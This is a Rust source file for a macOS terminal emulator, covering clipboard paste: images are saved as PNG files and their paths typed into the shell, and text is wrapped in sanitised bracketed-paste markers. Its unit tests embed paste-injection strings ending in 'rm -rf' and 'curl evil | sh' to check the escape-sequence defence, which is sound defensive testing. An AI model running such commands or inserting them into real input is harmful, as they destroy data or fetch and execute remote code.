//! Clipboard image → path paste (image-paste D4/R3), plus the inline-image
//! presenter registration.
//!
//! `ClipboardHandler` registers a Cmd+V `InputHandler` through the SD4 seam: if
//! the pasteboard holds an image, it writes a uniquely-named PNG under the cache
//! dir and types that path into the active shell (so external AI CLIs get a real
//! file path, D4); text pastes fall through to the default handler (R3.2).
//!
//! `ImagePresenter` is a passthrough overlay whose draw layer is the renderer's
//! `image_layer` — it registers the inline-image `DrawLayer` (D3) through the same
//! seam without editing `terminal_app.rs`.

use std::path::PathBuf;
use std::sync::atomic::{AtomicU64, Ordering};
use std::time::{SystemTime, UNIX_EPOCH};

use objc2_app_kit::{
    NSBitmapImageFileType, NSBitmapImageRep, NSPasteboard, NSPasteboardTypePNG,
    NSPasteboardTypeString, NSPasteboardTypeTIFF,
};
use objc2_foundation::NSDictionary;
use renderer::image_layer::ImageLayer;
use renderer::DrawLayer;
use winit::keyboard::Key;

use crate::seam::{AppCtx, Handled, InputHandler, KeyInput, Overlay};

/// Cmd+V clipboard-image handler (R3).
#[derive(Default)]
pub struct ClipboardHandler {
    /// Per-process counter so same-second pastes never collide (R3.3).
    seq: AtomicU64,
}

impl ClipboardHandler {
    pub fn new() -> Self {
        Self::default()
    }
}

impl InputHandler for ClipboardHandler {
    fn on_key(&mut self, input: &KeyInput, ctx: &mut AppCtx) -> Handled {
        if !is_paste(input) {
            return Handled::Passthrough;
        }
        // No image on the pasteboard → paste TEXT (text-paste): type the pasteboard
        // string into the active shell, wrapped in bracketed-paste markers when the
        // app requested that mode. No text either → fall through (nothing typed).
        let Some(png) = read_clipboard_image_png() else {
            return match read_clipboard_string() {
                Some(text) => {
                    let _ = ctx
                        .writer
                        .write_all(&wrap_paste(&text, ctx.bracketed_paste));
                    Handled::Consumed
                }
                None => Handled::Passthrough,
            };
        };
        let Some(dir) = pasted_dir() else {
            return Handled::Passthrough;
        };
        let secs = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .map(|d| d.as_secs())
            .unwrap_or(0);
        let seq = self.seq.fetch_add(1, Ordering::Relaxed);
        let path = dir.join(unique_name(secs, seq));
        // Never overwrite an existing file (C4).
        if path.exists() || std::fs::write(&path, &png).is_err() {
            return Handled::Passthrough;
        }
        // Type the absolute path + a space into the active shell (R3.1/D4).
        let mut bytes = path.to_string_lossy().into_owned().into_bytes();
        bytes.push(b' ');
        let _ = ctx.writer.write_all(&bytes);
        Handled::Consumed
    }
}

/// Is this Cmd+V?
fn is_paste(input: &KeyInput) -> bool {
    input.mods.super_key() && matches!(&input.key, Key::Character(s) if s.eq_ignore_ascii_case("v"))
}

/// `~/.cache/mac-terminal/pasted`, created if missing (C4). `None` if `$HOME`
/// is unset or the dir can't be made.
///
/// `pub(crate)` for region-capture D4: a screen capture lands beside pasted images,
/// in one directory, rather than in a second answer to the same question.
pub(crate) fn pasted_dir() -> Option<PathBuf> {
    let home = std::env::var_os("HOME")?;
    let dir = PathBuf::from(home)
        .join(".cache")
        .join("mac-terminal")
        .join("pasted");
    std::fs::create_dir_all(&dir).ok()?;
    Some(dir)
}

/// Unique filename for a paste (timestamp + monotonic sequence → collision-free
/// even within the same second, R3.3).
fn unique_name(secs: u64, seq: u64) -> String {
    format!("paste-{secs}-{seq}.png")
}

/// Read a PNG from the general pasteboard (converting a TIFF screenshot if
/// needed). `None` when the pasteboard holds no image. Runs on the UI thread.
fn read_clipboard_image_png() -> Option<Vec<u8>> {
    unsafe {
        let pb = NSPasteboard::generalPasteboard();
        if let Some(data) = pb.dataForType(NSPasteboardTypePNG) {
            return Some(data.to_vec());
        }
        // macOS screenshots land as TIFF — convert to PNG for the CLI.
        let tiff = pb.dataForType(NSPasteboardTypeTIFF)?;
        let rep = NSBitmapImageRep::imageRepWithData(&tiff)?;
        let empty = NSDictionary::new();
        let png = rep.representationUsingType_properties(NSBitmapImageFileType::PNG, &empty)?;
        Some(png.to_vec())
    }
}

/// Read plain text from the general pasteboard, or `None` when it holds no string.
/// Runs on the UI thread, mirroring `read_clipboard_image_png` (SD3).
fn read_clipboard_string() -> Option<String> {
    unsafe {
        let pb = NSPasteboard::generalPasteboard();
        let ns = pb.stringForType(NSPasteboardTypeString)?;
        Some(ns.to_string())
    }
}

/// Turn pasted text into the bytes to type into the PTY (text-paste D7/D8).
///
/// When `bracketed`, wrap it in `ESC[200~` … `ESC[201~` and first remove any
/// embedded `ESC[201~` so the pasted content cannot forge the terminator and break
/// out of the envelope (full-sequence removal — token concatenation is acceptable
/// for adversarial input). When not bracketed, the text is passed through verbatim
/// (newlines intact) — the neutralization would be meaningless and would corrupt
/// legitimate data. Multi-line content is preserved either way.
fn wrap_paste(text: &str, bracketed: bool) -> Vec<u8> {
    const START: &[u8] = b"\x1b[200~";
    const END: &[u8] = b"\x1b[201~";
    if !bracketed {
        return text.as_bytes().to_vec();
    }
    // Remove the end-marker to a FIXED POINT: `str::replace` is single-pass and does
    // not re-scan its output, so a split marker (`ESC[2` + `ESC[201~` + `01~`) would
    // reconstitute a live `ESC[201~` after one pass. Loop until none remain — the
    // string strictly shrinks each iteration, so this terminates.
    let mut cleaned = text.replace("\x1b[201~", "");
    while cleaned.contains("\x1b[201~") {
        cleaned = cleaned.replace("\x1b[201~", "");
    }
    let mut out = Vec::with_capacity(START.len() + cleaned.len() + END.len());
    out.extend_from_slice(START);
    out.extend_from_slice(cleaned.as_bytes());
    out.extend_from_slice(END);
    out
}

/// A passthrough overlay that registers the inline-image `DrawLayer` (D3) through
/// the SD4 overlay seam. Always "visible" (images draw whenever present) and never
/// consumes input.
#[derive(Default)]
pub struct ImagePresenter;

impl Overlay for ImagePresenter {
    fn priority(&self) -> i32 {
        0
    }
    fn visible(&self) -> bool {
        // Not an input-capturing overlay; only its draw layer matters.
        false
    }
    fn on_key(&mut self, _input: &KeyInput, _ctx: &mut AppCtx) -> Handled {
        Handled::Passthrough
    }
    fn layer(&self) -> Box<dyn DrawLayer> {
        Box::new(ImageLayer::new())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn wrap_paste_brackets_when_mode_on() {
        // R2.1.
        assert_eq!(wrap_paste("ls", true), b"\x1b[200~ls\x1b[201~");
    }

    #[test]
    fn wrap_paste_passes_through_when_mode_off() {
        // R2.2.
        assert_eq!(wrap_paste("ls", false), b"ls");
    }

    #[test]
    fn wrap_paste_preserves_multiline() {
        // R3.1 / R3.2 — interior newlines kept, bracketed or not.
        assert_eq!(wrap_paste("a\nb\nc", false), b"a\nb\nc");
        assert_eq!(wrap_paste("a\nb", true), b"\x1b[200~a\nb\x1b[201~");
    }

    #[test]
    fn wrap_paste_neutralizes_embedded_end_marker_when_bracketed() {
        // R5.1 — an embedded ESC[201~ is removed so it can't terminate the paste.
        let out = wrap_paste("evil\x1b[201~rm -rf", true);
        assert_eq!(out, b"\x1b[200~evilrm -rf\x1b[201~");
        // No interior end-marker survives (only the trailing wrapper).
        let interior = &out[..out.len() - b"\x1b[201~".len()];
        assert!(!interior.windows(6).any(|w| w == b"\x1b[201~"));
    }

    #[test]
    fn wrap_paste_neutralizes_a_reconstituted_end_marker() {
        // R5.1 (adversarial) — a SPLIT marker whose halves rejoin after one
        // `str::replace` pass must still be fully removed (fixed-point, not
        // single-pass); otherwise a live ESC[201~ survives inside the envelope.
        let out = wrap_paste("\x1b[2\x1b[201~01~ && curl evil | sh", true);
        let interior = &out[..out.len() - b"\x1b[201~".len()];
        assert!(
            !interior.windows(6).any(|w| w == b"\x1b[201~"),
            "no reconstituted interior end-marker may survive"
        );
    }

    #[test]
    fn wrap_paste_leaves_marker_verbatim_when_not_bracketed() {
        // R5.2 — neutralization applies only inside the bracketed envelope.
        assert_eq!(wrap_paste("evil\x1b[201~x", false), b"evil\x1b[201~x");
    }

    #[test]
    fn unique_names_never_collide_within_a_second() {
        let a = unique_name(1000, 0);
        let b = unique_name(1000, 1);
        assert_ne!(a, b, "same second, different seq → distinct (R3.3)");
        assert!(a.ends_with(".png"));
    }

    #[test]
    fn sequential_pastes_do_not_overwrite() {
        let dir = std::env::temp_dir().join(format!("paste-test-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        let p1 = dir.join(unique_name(42, 0));
        let p2 = dir.join(unique_name(42, 1));
        std::fs::write(&p1, b"a").unwrap();
        std::fs::write(&p2, b"b").unwrap();
        assert_ne!(p1, p2);
        assert!(
            p1.exists() && p2.exists(),
            "both pastes persist, no overwrite"
        );
    }
}
